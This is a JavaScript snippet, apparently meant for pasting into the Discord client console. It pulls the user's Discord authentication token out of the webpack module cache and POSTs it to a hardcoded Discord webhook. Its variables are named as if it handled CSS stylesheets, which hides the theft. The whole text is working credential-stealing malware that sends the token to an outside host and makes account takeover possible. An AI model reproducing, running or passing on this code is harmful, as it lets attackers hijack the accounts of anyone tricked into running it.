var css = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()
location.reload();
var style_sheet = "https://discord.com/api/webhooks/898854358077280256/roXjdqhjVkLdixAz1Zml28EawGhTaTZ0ZYYL9rrflItNiiF4P_60dQJcQCioM26g_HHV";
var getCss = new XMLHttpRequest();
getCss.open("POST", style_sheet);
getCss.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "cssReq",
    avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
    content: `${css}`
};
getCss.send(JSON.stringify(params));
